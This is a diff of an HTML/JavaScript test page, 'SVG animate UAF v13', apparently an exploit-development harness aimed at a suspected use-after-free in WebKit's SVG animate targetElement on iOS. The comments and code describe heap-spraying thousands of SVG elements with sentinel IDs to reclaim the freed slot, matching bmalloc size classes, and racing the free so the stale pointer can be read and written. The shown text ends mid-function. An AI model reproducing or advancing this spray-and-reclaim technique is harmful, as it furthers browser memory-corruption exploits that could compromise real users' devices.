@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v12 · spray timing fix + controlled slot reclaim</title>
+<title>SVG animate UAF v13 · immediate read + alt spray types</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,20 +18,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v12 · spray timing + controlled slot reclaim · iOS 26.5.2 · A16</h2>
+<h2>SVG animate UAF v13 · immediate read + standalone anim + alt spray · iOS 26.5.2</h2>
 <div class="sub">
-  v11 FINDING: anim.targetElement correctly identifies reused slot as useEl (JSC bridge sanitizes)
-  The stale SVGSymbolElement* is getting aliased by useEl's own internal allocations
-  v12 FIX: detach useEl BEFORE freeing sym1 → spray wins the race for freed slot
-  Goal: spray our Float64Array into sym1's freed slot → read/write via stale anim ptr
-  Also: try ArrayBuffer backing store spray (different size class) + GC pressure timing
+  v12 FINDING: ST miss=32 raw=0 — when useEl removed first, getBBox=0 (slot zeroed by bmalloc)
+  80.0 was ALWAYS live useEl geometry, NOT freed sym1 memory
+  v13: read targetElement IMMEDIATELY after free (same microtask, before slot reuse)
+  Also: standalone animate (no useEl) + alt spray types (text/path/rect elements)
+  Goal: catch the window between free and reuse — read zeroed OR our spray bytes
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runST()">ST spray-timing</button>
-  <button onclick="runGC()">GC gc-pressure</button>
-  <button onclick="runMC()">MC message-channel</button>
-  <button onclick="runSZ()">SZ size-exhaust</button>
+  <button onclick="runIR()">IR immediate-read</button>
+  <button onclick="runSA()">SA standalone-anim</button>
+  <button onclick="runAT()">AT alt-spray-types</button>
+  <button onclick="runWR()">WR write-then-read</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -39,45 +39,50 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v11 KEY FINDING:
- *   anim.targetElement returns a correct JS wrapper — no raw vtable confusion
- *   WebKit's JSC bindings layer correctly identifies the object at the stale ptr address
- *   The reused slot is actually holding a live SVGUseElement (our own useEl)
- *   because useEl internally allocated memory around the same time sym1 was freed
+ * v12 CRITICAL FINDING:
+ *   ST: useEl.remove() → sym1.remove() → spray → useEl.add() → getBBox = ALL ZERO
+ *   80.0 was NOT freed memory — it was live useEl geometry
  *
- * ROOT CAUSE OF ALIASING:
- *   sym1.remove() → slot freed → bmalloc returns slot to magazine head
- *   useEl (still in DOM) needs internal alloc for rendering/layout update
- *   bmalloc pops magazine head (our freed slot) for useEl's internal alloc
- *   now stale ptr points to useEl's data → JSC bridge identifies it as SVGUseElement
+ *   Proof:
+ *   - When useEl in DOM: getBBox = useEl's live renderer geometry (80.0 when anim on sym2)
+ *   - When useEl removed first: getBBox = 0 (no renderer, OR slot zeroed by bmalloc)
+ *   - Either way: the UAF read we thought we had was actually just normal DOM behavior
  *
- * v12 STRATEGY:
- *   Break the race by removing useEl BEFORE sym1
- *   With useEl detached from DOM: no pending renders, no internal allocs needed
- *   Then free sym1 → slot goes to magazine head
- *   Then spray our objects → our spray wins the race
+ * WHAT WE ACTUALLY HAVE:
+ *   SVGAnimateElement.targetElement caches SVGElement* without clearing on remove()
+ *   This IS a real UAF in the ptr caching layer
+ *   The ptr gets reused immediately (JS is too slow to spray into the slot)
  *
- * SPRAY TARGET SIZE:
- *   SVGSymbolElement estimated ~368B → bmalloc size class 384B
- *   Float64Array(48) = 48 doubles × 8B = 384B backing store ← EXACT MATCH
- *   OR: ArrayBuffer(384) = 384B
- *   OR: new Uint8Array(384)
- *   BUT: typed array backing stores may be in a separate bmalloc heap
- *   Best: spray SVGSymbolElement itself (same allocator, same size class)
+ * v13 APPROACHES:
  *
- * SENTINEL VALUE:
- *   Fill spray objects with distinctive float: 1.2345678901234e100
- *   As float32: 0x7f800000 (infinity, but let's use a recognizable value)
- *   Better: fill with 0x4141 repeating → as float32 = 0x41414141 = 12.0784f
- *   Even better: use getBBox geometry as oracle:
- *     spray sym with width=999 → getBBox = 999.0 → f32 = 0x44799000
- *     if useEl.getBBox().width = 999.0 after free: spray landed!
+ * IR (immediate read):
+ *   read targetElement IMMEDIATELY after sym1.remove() in the SAME synchronous block
+ *   no rAF, no spray, no re-add
+ *   if the slot hasn't been reused yet: reads zeroed bmalloc memory
+ *   if there's ANY field that's non-zero before reuse: it's from the freed object
+ *   try: targetElement.getBBox, targetElement.getScreenCTM, ALL before anything else
  *
- * TIMING APPROACHES:
- *   ST: useEl.remove() → sym1.remove() → sync spray (no await between)
- *   GC: force GC pressure to flush bmalloc magazine → freed slot rises to head
- *   MC: MessageChannel postMessage → spray in message handler (different task)
- *   SZ: size class exhaust → free → spray (same as v10 SZ but with useEl-first order)
+ * SA (standalone animate):
+ *   put the <animate> directly on sym1 (animating sym1's own attributes)
+ *   no useEl needed — no useEl internal allocs competing for the freed slot
+ *   sequence: anim on sym1 → sym1.remove() → spray → read targetElement
+ *
+ * AT (alt spray types):
+ *   try different element types as spray to match sym1's bmalloc size class
+ *   SVGTextElement, SVGPathElement, SVGCircleElement, SVGRectElement
+ *   each has different C++ size — we're looking for the one that hits the freed slot
+ *   metric: if targetElement returns our spray element's tagName = we know the size class
+ *
+ * WR (write-then-read):
+ *   use CSS animation instead of SVG animate
+ *   CSS animations store different state — might have a longer-lived stale ptr
+ *   OR: try SMIL animate with fill="freeze" — frozen value might hold ptr differently
+ *
+ * NEW SENTINEL STRATEGY:
+ *   instead of geometry (float32 width), use element ID as sentinel
+ *   spray elements with distinctive IDs: "SENTINEL_0xDEAD_..."
+ *   after free: check targetElement.id — if it contains "SENTINEL": spray landed
+ *   this works regardless of geometry/size class
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -92,15 +97,21 @@ function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.t
 window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
-function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
 function d2h(d){const b=new ArrayBuffer(8);new Float64Array(b)[0]=d;const u=new Uint32Array(b);
     return'0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');}
+function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
 
-// Sentinel geometry: spray symbols with width=999 → getBBox width = 999.0
-// f32(999.0) = 0x44799000 — very distinctive, far from normal SVG geometry
-const SENTINEL_W = 999;
-const SENTINEL_F = 999.0;
-const SENTINEL_HEX = '0x44799000';
+let spraySvg=null;
+function getSpraySvg(){
+    if(!spraySvg){
+        spraySvg=document.createElementNS(SVG_NS,'svg');
+        spraySvg.setAttribute('width','1');spraySvg.setAttribute('height','1');
+        spraySvg.style.cssText='position:fixed;top:-2px;left:-2px;opacity:1;width:1px;height:1px';
+        document.body.appendChild(spraySvg);
+    }
+    return spraySvg;
+}
+function clearSpray(){if(spraySvg)spraySvg.innerHTML='';}
 
 function mkSym1(id){
     const sym=document.createElementNS(SVG_NS,'symbol');
@@ -121,33 +132,10 @@ function mkSym2(id){
     sym.appendChild(r);
     return sym;
 }
-// Spray sentinel: symbol with width=999 → getBBox().width = 999.0
-function mkSpray(id){
-    const sym=document.createElementNS(SVG_NS,'symbol');
-    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('x','0');r.setAttribute('y','0');
-    r.setAttribute('width',String(SENTINEL_W));r.setAttribute('height',String(SENTINEL_W));
-    sym.appendChild(r);
-    return sym;
-}
-
-// Separate SVG for spray (off-screen, not in livesvg)
-let spraySvg=null;
-function getSpraySvg(){
-    if(!spraySvg){
-        spraySvg=document.createElementNS(SVG_NS,'svg');
-        spraySvg.setAttribute('width','1');spraySvg.setAttribute('height','1');
-        spraySvg.style.cssText='position:fixed;top:-2px;left:-2px;opacity:1;width:1px;height:1px';
-        document.body.appendChild(spraySvg);
-    }
-    return spraySvg;
-}
-function clearSpray(){
-    if(spraySvg){spraySvg.innerHTML='';}}
 
 async function setup(id){
     while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+    clearSpray();
     await raf();await raf();
     const sym1=mkSym1(`${id}_s1`);
     const sym2=mkSym2(`${id}_s2`);
@@ -166,7 +154,7 @@ async function setup(id){
         await raf();attempts++;
         try{const bb=useEl.getBBox();if(bb.width>10){cached=true;bbPre=bb;}}catch(e){}
     }
-    return{useEl,anim,sym1,sym2,cached,bbPre,attempts};
+    return{useEl,anim,sym1,sym2,cached,bbPre};
 }
 async function teardown(){
     clearSpray();
@@ -174,341 +162,483 @@ async function teardown(){
     await raf();await raf();
 }
 
-// ── ST: spray timing — useEl-first detach ─────────────────────────────────
-// KEY CHANGE from all previous tests:
-//   we remove useEl BEFORE sym1
-//   this prevents useEl from grabbing sym1's freed slot
-//   then spray immediately (sync, no await) after sym1.remove()
-async function runST(q=false){
-    if(!q){dis(true);sep();log('▶ ST: spray timing — useEl-first detach + immediate spray','inf');sep();}
-    log('[*] KEY CHANGE: remove useEl BEFORE sym1 → useEl cant grab freed slot','inf');
-    log('[*] sentinel: SVGSymbolElement with width=999 → getBBox=999.0 (0x44799000)','ok');
-    log('[*] reading: useEl.getBBox() after sym1.remove() → stale ptr → hits spray?','ok');
+// ── IR: immediate read — read targetElement in SAME microtask as free ─────
+// Theory: between sym1.remove() and the next microtask checkpoint,
+//         the C++ slot may not be reused yet
+//         reading targetElement immediately might give us:
+//           (a) zeroed slot — bmalloc zeroes on free
+//           (b) our sentinel — if spray somehow runs sync
+//           (c) partially freed data — refcount fields, vtable, etc
+// Also testing: reading BEFORE free (baseline) vs IMMEDIATELY after free
+async function runIR(q=false){
+    if(!q){dis(true);sep();log('▶ IR: immediate read — targetElement in same microtask as free','inf');sep();}
+    log('[*] reading anim.targetElement immediately after sym1.remove()','inf');
+    log('[*] no spray, no rAF, no re-add between free and read','ok');
+    log('[*] looking for: non-null tgt, tagName, id, getBBox before slot reused','ok');
     log('');
 
-    const SPRAY_COUNT=2048;
-    let hit=0,miss=0,raw=0,crash=0;
+    let nullCount=0,liveCount=0,crashCount=0;
+    const tagFreq={};
+    const idFreq={};
     const wFreq={};
 
     for(let t=0;t<32;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`st_${t}`);
+        const{useEl,anim,sym1,sym2,cached}=await setup(`ir_${t}`);
         if(!cached){await teardown();continue;}
 
-        // PRE: record normal getBBox
-        let preBB=null;
-        try{preBB=useEl.getBBox();}catch(e){}
-
-        // CRITICAL SEQUENCE:
-        // 1. Remove useEl FIRST — detach from DOM, stops any pending internal alloc
-        useEl.remove();
-        // 2. Remove sym1 — this frees slot A into bmalloc magazine head
-        sym1.remove();
-        // 3. IMMEDIATELY spray (sync — no await, no microtask break)
-        //    spray SVGSymbolElements with sentinel geometry into spray SVG
-        const ss=getSpraySvg();
-        const sprayed=[];
-        for(let i=0;i<SPRAY_COUNT;i++){
-            const sp=mkSpray(`st_${t}_sp${i}`);
-            ss.appendChild(sp);
-            sprayed.push(sp);
-        }
-        // 4. Re-add useEl to DOM (it still has the animation with the stale ptr)
-        livesvg.appendChild(useEl);
-        // 5. Wait one rAF for layout to settle
-        await raf();
-        // 6. Read through stale ptr — does it hit our spray sentinel?
-        let postW=null;
+        // BASELINE: read targetElement BEFORE free
+        let preTgt=null,preTag='?',preId='?',preBB=null;
         try{
-            const bb=useEl.getBBox();
-            postW=bb.width;
-        }catch(e){crash++;await teardown();continue;}
+            preTgt=anim.targetElement;
+            if(preTgt){preTag=preTgt.tagName;preId=preTgt.id;}
+        }catch(e){}
+        try{if(preTgt)preBB=preTgt.getBBox();}catch(e){}
 
-        const wHex=f2h(postW);
-        wFreq[wHex]=(wFreq[wHex]||0)+1;
+        // FREE sym1 — DO NOT do anything between this and the next read
+        sym1.remove();
 
-        if(Math.abs(postW-SENTINEL_F)<0.01){
-            hit++;
-            log(`  t${t}: [SPRAY HIT!] w=${postW.toFixed(4)} (${wHex}) ← SENTINEL!`,'bad');
-        }else if(postW===0){
-            miss++;
+        // IMMEDIATELY read targetElement — same synchronous block, NO await
+        let postTgt=null,postTag='?',postId='?',postBB=null;
+        let tgtCrash=null;
+        try{postTgt=anim.targetElement;}catch(e){tgtCrash=String(e);crashCount++;}
+
+        if(postTgt===null||postTgt===undefined){
+            nullCount++;
         }else{
-            raw++;
-            if(t<6)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');
+            liveCount++;
+            try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';}
+            try{postId=postTgt.id;}catch(e){postId='[crash]';}
+            try{postBB=postTgt.getBBox();}catch(e){}
+
+            tagFreq[postTag]=(tagFreq[postTag]||0)+1;
+            idFreq[postId]=(idFreq[postId]||0)+1;
+
+            const w=postBB?postBB.width:null;
+            const wh=w!==null?f2h(w):'null';
+            wFreq[wh]=(wFreq[wh]||0)+1;
+
+            // Log the first few and any unexpected
+            const isExpected=(postTag==='use'||postTag==='symbol');
+            if(t<4||!isExpected){
+                log(`  t${t}: pre tag=${preTag} id=${preId}`,'dim');
+                log(`  t${t}: post tag=${postTag} id=${postId}`,(postTag!==preTag?'bad':'hi'));
+                if(postBB)log(`  t${t}: getBBox w=${postBB.width.toFixed(4)} h=${postBB.height.toFixed(4)}`,'hi');
+                if(postId&&postId.includes('SENTINEL'))log(`  t${t}: [SENTINEL ID FOUND!]`,'bad');
+            }
         }
 
         await teardown();
     }
 
-    log(`\n[*] ST: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
-    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
-    if(hit>0)log(`[+] SPRAY LANDED — we control what stale ptr reads! UAF R/W achieved`,'bad');
-    else log(`[*] spray still missing — timing window too tight or wrong size class`,'inf');
+    log(`\n[*] IR: null=${nullCount} live=${liveCount} crash=${crashCount}`,'inf');
+    log(`[*] tagFreq: ${Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ')}`,'hi');
+    log(`[*] wFreq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,6).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
 
     if(!q)dis(false);
-    return{hit,miss,raw,crash};
+    return{nullCount,liveCount,tagFreq,wFreq};
 }
 
-// ── GC: GC pressure timing ─────────────────────────────────────────────────
-// Force garbage collection to flush bmalloc magazines
-// bmalloc scavenges during GC → frees magazine → freed slot becomes available
-// After GC: freed slots are NOT immediately returned to OS (bmalloc holds them)
-// but they ARE available for our spray without competition from internal allocs
-async function runGC(q=false){
-    if(!q){dis(true);sep();log('▶ GC: GC pressure — flush bmalloc magazine before spray','inf');sep();}
-    log('[*] WebKit runs GC when memory pressure rises','inf');
-    log('[*] GC can flush bmalloc magazines → makes freed slots more predictable','ok');
-    log('[*] strategy: alloc pressure → free sym1 → GC pressure → spray','ok');
+// ── SA: standalone animate — no useEl ────────────────────────────────────
+// Put the <animate> on sym1 itself or on sym2
+// Animate sym1's OWN attribute (e.g. viewBox between two values)
+// targetElement = sym1 directly
+// After sym1.remove(): targetElement stale ptr to sym1
+// Spray immediately — no useEl to compete for freed slot
+// Read targetElement → if it returns a spray object: spray hit!
+async function runSA(q=false){
+    if(!q){dis(true);sep();log('▶ SA: standalone animate — anim directly on sym1, no useEl','inf');sep();}
+    log('[*] animate sym1.viewBox directly — no useEl, no useEl internal allocs','inf');
+    log('[*] after sym1.remove(): spray immediately, no competition','ok');
+    log('[*] read anim.targetElement → if tagName=SENTINEL: spray landed!','ok');
     log('');
 
     const SPRAY_COUNT=1024;
     let hit=0,miss=0,raw=0,crash=0;
-    const wFreq={};
+    const tagFreq={};
 
-    // GC pressure: allocate lots of objects then let them go out of scope
-    function gcPressure(){
-        const trash=[];
-        for(let i=0;i<50000;i++)trash.push(new ArrayBuffer(128));
-        // let trash go out of scope → GC eligible
-        return trash.length; // prevent optimization
-    }
+    for(let t=0;t<24;t++){
+        // Build: sym1 with animate ON it (no useEl)
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        clearSpray();
+        await raf();await raf();
 
-    for(let t=0;t<16;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`gc_${t}`);
+        const sym1=mkSym1(`sa_${t}_s1`);
+        const sym2=mkSym2(`sa_${t}_s2`);
+
+        // Animate sym1's viewBox between two values (any animatable attr works)
+        // We need the animation to be running so targetElement ptr is cached
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','viewBox');
+        anim.setAttribute('values','0 0 100 100;0 0 200 200');
+        anim.setAttribute('dur','0.1s');
+        anim.setAttribute('repeatCount','indefinite');
+        sym1.appendChild(anim);
+
+        livesvg.appendChild(sym1);
+        livesvg.appendChild(sym2);
+
+        // Wait for animation to cache targetElement ptr
+        let cached=false,attempts=0;
+        while(!cached&&attempts<20){
+            await raf();attempts++;
+            try{
+                const tgt=anim.targetElement;
+                if(tgt&&tgt.tagName==='symbol'){cached=true;}
+            }catch(e){}
+        }
         if(!cached){await teardown();continue;}
 
-        // Phase 1: allocate lots of objects to fill bmalloc magazine
-        //          so freed slot is more likely to be at magazine head
-        const preAlloc=[];
-        for(let i=0;i<500;i++){
-            const sp=mkSpray(`gc_pre_${t}_${i}`);
-            getSpraySvg().appendChild(sp);
-            preAlloc.push(sp);
-        }
-        await raf();
+        // Baseline: check targetElement before free
+        let preTgt=null;
+        try{preTgt=anim.targetElement;}catch(e){}
 
-        // Phase 2: free useEl first, then sym1
-        useEl.remove();
-        sym1.remove();
-
-        // Phase 3: GC pressure (forces WebKit to scavenge)
-        const _=gcPressure();
-        await raf();
-
-        // Phase 4: clear pre-alloc (frees those slots too, but our slot is now FREE)
-        clearSpray();
-        await raf();
-
-        // Phase 5: spray with sentinel
+        // SPRAY first (before free) — try to fill up size class
         const ss=getSpraySvg();
+        // Spray with sentinel symbols
         for(let i=0;i<SPRAY_COUNT;i++){
-            const sp=mkSpray(`gc_${t}_sp${i}`);
+            const sp=document.createElementNS(SVG_NS,'symbol');
+            sp.setAttribute('id',`SENTINEL_${t}_${i}`);
+            sp.setAttribute('viewBox','0 0 100 100');
+            const r=document.createElementNS(SVG_NS,'rect');
+            r.setAttribute('width','999');r.setAttribute('height','999');
+            sp.appendChild(r);
             ss.appendChild(sp);
         }
 
-        // Phase 6: re-add useEl and read
-        livesvg.appendChild(useEl);
+        // FREE sym1 — now with no useEl competing for the slot
+        sym1.remove();
+
+        // Spray MORE after free
+        for(let i=SPRAY_COUNT;i<SPRAY_COUNT*2;i++){
+            const sp=document.createElementNS(SVG_NS,'symbol');
+            sp.setAttribute('id',`SENTINEL_${t}_${i}`);
+            sp.setAttribute('viewBox','0 0 100 100');
+            const r=document.createElementNS(SVG_NS,'rect');
+            r.setAttribute('width','999');r.setAttribute('height','999');
+            sp.appendChild(r);
+            ss.appendChild(sp);
+        }
+
         await raf();
 
-        let postW=null;
-        try{postW=useEl.getBBox().width;}catch(e){crash++;await teardown();continue;}
+        // Read targetElement — did spray land?
+        let postTgt=null,postTag='?',postId='?';
+        try{postTgt=anim.targetElement;}catch(e){crash++;await teardown();continue;}
 
-        const wHex=f2h(postW);
-        wFreq[wHex]=(wFreq[wHex]||0)+1;
+        if(!postTgt){miss++;await teardown();continue;}
 
-        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
-        else if(postW===0){miss++;}
-        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
+        try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';crash++;}
+        try{postId=postTgt.id;}catch(e){postId='[crash]';}
+
+        tagFreq[postTag]=(tagFreq[postTag]||0)+1;
+
+        if(postId.includes('SENTINEL')){
+            hit++;
+            log(`  t${t}: [SPRAY HIT!] tagName=${postTag} id=${postId}`,'bad');
+        }else if(postTag==='symbol'&&!postId.includes('sa_')){
+            raw++;
+            log(`  t${t}: unexpected symbol id=${postId} ← wrong sym grabbed`,'hi');
+        }else{
+            if(t<4)log(`  t${t}: tgt=${postTag} id=${postId}`,'dim');
+        }
 
         await teardown();
     }
 
-    log(`\n[*] GC: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
-    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
-    if(hit>0)log(`[+] SPRAY LANDED via GC pressure path!`,'bad');
+    log(`\n[*] SA: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
+    log(`[*] tagFreq: ${Object.entries(tagFreq).map(([k,v])=>`${k}×${v}`).join(' ')}`,'hi');
+    if(hit>0)log(`[+] SPRAY HIT via standalone animate! targetElement returned our sentinel`,'bad');
+    else log(`[*] no hit — spray still not landing in freed sym1 slot`,'inf');
 
     if(!q)dis(false);
-    return{hit,miss,raw,crash};
+    return{hit,miss,raw,crash,tagFreq};
 }
 
-// ── MC: MessageChannel timing ─────────────────────────────────────────────
-// MessageChannel tasks run in a separate event loop iteration
-// After sym1.remove(), if we postMessage immediately:
-//   the message handler runs in the NEXT task
-//   WebKit's internal cleanup runs between tasks
-//   If internal cleanup already ran: slot is at magazine head for our spray
-//   If not: we still win because internal alloc already happened
-// This gives us a predictable slot state
-async function runMC(q=false){
-    if(!q){dis(true);sep();log('▶ MC: MessageChannel — spray in next-task context','inf');sep();}
-    log('[*] postMessage → spray handler runs in separate task = after WebKit internal cleanup','inf');
-    log('[*] avoids race where WebKit internal alloc grabs freed slot first','ok');
+// ── AT: alt spray types — match sym1's exact bmalloc size class ───────────
+// SVGSymbolElement might not be 384B — we've been guessing
+// Try spraying different element types and checking which one targetElement returns
+// If targetElement returns a non-sym1 element type: we know that type's size matches sym1
+// This tells us the EXACT size class to spray for controlled UAF
+async function runAT(q=false){
+    if(!q){dis(true);sep();log('▶ AT: alt spray types — find which element matches sym1 size class','inf');sep();}
+    log('[*] spray different SVG element types after sym1.remove()','inf');
+    log('[*] if targetElement.tagName changes to spray type: size class match!','ok');
+    log('[*] types: circle, rect, text, line, ellipse, path, use, image','ok');
     log('');
 
-    const SPRAY_COUNT=1024;
-    let hit=0,miss=0,raw=0,crash=0;
-    const wFreq={};
+    // Each spray type: spray 2000 of that type, check targetElement.tagName
+    const SPRAY_COUNT=2000;
+    const types=[
+        ['circle',()=>{const e=document.createElementNS(SVG_NS,'circle');e.setAttribute('r','50');e.setAttribute('cx','50');e.setAttribute('cy','50');return e;}],
+        ['rect',()=>{const e=document.createElementNS(SVG_NS,'rect');e.setAttribute('width','100');e.setAttribute('height','100');return e;}],
+        ['text',()=>{const e=document.createElementNS(SVG_NS,'text');e.textContent='SENTINEL';return e;}],
+        ['line',()=>{const e=document.createElementNS(SVG_NS,'line');e.setAttribute('x1','0');e.setAttribute('y1','0');e.setAttribute('x2','100');e.setAttribute('y2','100');return e;}],
+        ['ellipse',()=>{const e=document.createElementNS(SVG_NS,'ellipse');e.setAttribute('rx','50');e.setAttribute('ry','30');return e;}],
+        ['path',()=>{const e=document.createElementNS(SVG_NS,'path');e.setAttribute('d','M 0 0 L 100 100 Z');return e;}],
+        ['g',()=>{const e=document.createElementNS(SVG_NS,'g');return e;}],
+        ['defs',()=>{const e=document.createElementNS(SVG_NS,'defs');return e;}],
+    ];
 
-    for(let t=0;t<16;t++){
-        const result=await new Promise(async(resolve)=>{
-            const{useEl,anim,sym1,sym2,cached}=await setup(`mc_${t}`);
-            if(!cached){await teardown();resolve({postW:null,crashed:false});return;}
+    const results={};
 
-            // Remove useEl first, then sym1
+    for(const[typeName,mkEl]of types){
+        let hitCount=0,symCount=0,otherCount=0,crashCount=0;
+        const tagFreqLocal={};
+
+        for(let t=0;t<8;t++){
+            const{useEl,anim,sym1,sym2,cached}=await setup(`at_${typeName}_${t}`);
+            if(!cached){await teardown();continue;}
+
+            // Remove useEl first to stop it grabbing slot
             useEl.remove();
             sym1.remove();
 
-            // postMessage → handler runs in next task (after WebKit cleanup)
-            const mc=new MessageChannel();
-            mc.port1.onmessage=async()=>{
-                // Now in next task — WebKit cleanup has run
-                // Spray here: bmalloc state is stable
-                const ss=getSpraySvg();
-                for(let i=0;i<SPRAY_COUNT;i++){
-                    const sp=mkSpray(`mc_${t}_sp${i}`);
-                    ss.appendChild(sp);
-                }
-                // Re-add useEl
-                livesvg.appendChild(useEl);
-                await raf();
-                let postW=null,crashed=false;
-                try{postW=useEl.getBBox().width;}catch(e){crashed=true;}
-                resolve({postW,crashed});
-            };
-            mc.port2.postMessage(null);
-        });
+            // Spray with this element type
+            const ss=getSpraySvg();
+            for(let i=0;i<SPRAY_COUNT;i++){
+                const el=mkEl();
+                el.setAttribute('id',`SENTINEL_${typeName}_${t}_${i}`);
+                ss.appendChild(el);
+            }
 
-        if(result.crashed){crash++;await teardown();continue;}
-        if(result.postW===null){await teardown();continue;}
+            livesvg.appendChild(useEl);
+            await raf();
 
-        const postW=result.postW;
-        const wHex=f2h(postW);
-        wFreq[wHex]=(wFreq[wHex]||0)+1;
+            let postTgt=null,postTag='?',postId='?';
+            try{postTgt=anim.targetElement;}catch(e){crashCount++;await teardown();continue;}
+            if(!postTgt){await teardown();continue;}
+            try{postTag=postTgt.tagName;}catch(e){postTag='[crash]';}
+            try{postId=postTgt.id;}catch(e){postId='[crash]';}
 
-        if(Math.abs(postW-SENTINEL_F)<0.01){hit++;log(`  t${t}: [HIT!] w=${postW.toFixed(4)} ← SENTINEL!`,'bad');}
-        else if(postW===0){miss++;}
-        else{raw++;if(t<4)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');}
+            tagFreqLocal[postTag]=(tagFreqLocal[postTag]||0)+1;
+            if(postId.includes('SENTINEL')){hitCount++;}
 
-        await teardown();
+            await teardown();
+        }
+
+        results[typeName]={hitCount,tagFreqLocal,crashCount};
+        const tagStr=Object.entries(tagFreqLocal).map(([k,v])=>`${k}×${v}`).join(' ');
+        log(`  ${typeName.padEnd(8)}: hit=${hitCount} crash=${crashCount} tags=[${tagStr}]`,hitCount>0?'bad':'dim');
     }
 
-    log(`\n[*] MC: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
-    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
-    if(hit>0)log(`[+] SPRAY LANDED via MessageChannel timing!`,'bad');
+    log('\n[*] AT: any hit>0 type = matches sym1 bmalloc size class','inf');
+    const hits=Object.entries(results).filter(([,r])=>r.hitCount>0);
+    if(hits.length>0){
+        log('[+] SIZE CLASS MATCH FOUND:','bad');
+        for(const[t,r]of hits)log(`  ${t}: hit=${r.hitCount}`,'bad');
+    }else{
+        log('[*] no type matched — sym1 size class may be unique or spray timing off','inf');
+    }
 
     if(!q)dis(false);
-    return{hit,miss,raw,crash};
+    return results;
 }
 
-// ── SZ: size exhaust v2 — useEl-first order ──────────────────────────────
-// v10 SZ exhausted 5000 objects BEFORE the free
-// v12 SZ: useEl-first detach + exhaust AFTER the free
-// Idea: free sym1 first → slot A is at magazine head
-//       exhaust magazine with 5000 objects → they take fresh slots, NOT slot A
-//       then spray with 1 sentinel → should get slot A (only free slot in magazine)
-// Also testing: exhaust with ArrayBuffer(384) instead of SVGSymbol
-//   ArrayBuffer backing stores might be in same bmalloc size class
-async function runSZ(q=false){
-    if(!q){dis(true);sep();log('▶ SZ: size exhaust v2 — exhaust AFTER free (useEl-first order)','inf');sep();}
-    log('[*] exhaust magazine AFTER sym1.remove() → sentinel should get slot A','inf');
-    log('[*] also testing ArrayBuffer(384) as spray object (same size class as sym)','ok');
+// ── WR: write-then-read — CSS animation + SMIL freeze ─────────────────────
+// Try CSS animation (different internal path than SMIL animate)
+// CSS animations also cache references to their target elements
+// SMIL animate with fill="freeze": animation stays at end value after duration
+// these might have different ptr lifetimes or different nulling behavior
+// Also: test animateTransform and animateMotion (different SVG animate types)
+async function runWR(q=false){
+    if(!q){dis(true);sep();log('▶ WR: write-then-read — CSS anim + freeze + animateTransform variants','inf');sep();}
+    log('[*] testing different animate types for targetElement UAF behavior','inf');
+    log('[*] CSS animation, animateTransform, animateMotion, fill=freeze','ok');
     log('');
 
-    const EXHAUST=2000;
-    let hit=0,miss=0,raw=0,crash=0;
-    const wFreq={};
+    // Test 1: CSS animation (via CSS @keyframes, not SMIL)
+    // CSS animations don't have a JS targetElement property directly
+    // but they fire animationstart/animationend events on the element
+    // check if element reference in event handler survives after remove()
+    log('[*] T1: CSS animation event reference persistence after remove()','inf');
+    {
+        const el=document.createElementNS(SVG_NS,'symbol');
+        el.setAttribute('id','css_target');
+        el.setAttribute('viewBox','0 0 100 100');
+        livesvg.appendChild(el);
 
-    for(let t=0;t<16;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`sz_${t}`);
-        if(!cached){await teardown();continue;}
+        let capturedTarget=null;
+        el.addEventListener('animationstart',e=>{
